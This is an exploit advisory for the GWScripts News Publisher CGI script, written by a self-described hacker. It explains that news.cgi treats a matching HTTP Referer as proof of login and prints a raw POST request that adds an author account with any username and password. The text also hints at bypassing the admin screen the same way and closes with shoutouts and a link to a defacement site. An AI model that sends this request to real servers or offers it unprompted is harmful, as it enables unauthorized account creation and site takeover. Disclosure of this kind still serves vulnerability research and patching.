It is possible for a remote user to add an author to the author index (author.file) in GWScripts News Publisher, a web news publisher. This can be done by requesting the following raw HTTP request using any arbitrary username and password:

POST /cgi-bin/news/news.cgi?addAuthor HTTP/1.0
Connection: close
User-Agent: user/browser
Host: target
Referer: http://target/cgi-bin/news/news.cgi
Content-type: application/x-www-form-urlencoded
Content-length: 71

# News Publisher EXPLOIT by n30
# Versions: tested on 1.05
#		      1.05a
#		      1.05b
#           	      1.06
# Bug Found By: me {n30}
# OS: Unix and Winnt
#
# The Problem:
#	The author decided in all his 'enlightened wisdom'
# that if the HTTP_REFERER url is the same as the News Publisher
# news.cgi file. Then U have OBVIOUSLY logged in?
#
# Exploit:
#	hmmm me thinks i should change the HTTP_REFERER to:
#
#	http://www.server.com/cgi/news.cgi
#
#	Using this exploit will add an author account with user kid
#	and passwerd of ur choice.
#
# NOTE: There are more inventive ways to use this Vulnerability :)
#	ie. maybe?? the Admin screen is protected by the HTTP_REFERER?
#
# n30@alldas.de
# www.alldas.de, defaced.alldas.de {trib's the webmaster not me!}
#
# Shoutz: trib, axess, domz, acidflame, raxie,  and all who know me!
